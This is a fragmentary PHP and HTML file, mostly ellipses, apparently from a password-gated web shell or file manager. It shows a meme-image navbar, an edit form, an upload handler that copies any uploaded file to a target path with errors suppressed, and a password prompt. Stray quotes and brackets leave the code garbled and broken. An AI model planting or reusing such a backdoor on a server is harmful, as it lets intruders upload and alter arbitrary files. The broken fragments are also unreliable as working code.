...
<nav class="navbar navbar-light" style="background-color: #e3f2fd;">
  ...
  <a href="?"><img src="https://mymodernmet.com/wp/wp-content/uploads/2018/01/bailey-dog-meme-thumbnail.jpg" width="100" height="100" alt=""></a>
');
...
";
    ...
    <form method="post">
        ...
        <input type="submit" value="Edit" name="edit">
            ...
            if (isset($_POST["upload"])) {
                ...
                } elseif (@copy($_FILES["fileToUpload"]["tmp_name"], $target_file)) {
                    echo htmlspecialchars(basename($_FILES["fileToUpload"]["name"])) . " has been uploaded.";
                } else {
    ...
    <?php
        ...
        echo '<form action="" method="post"><input type="password" name="pass"><button type="submit" name="check">OK!</button></form>';
    }
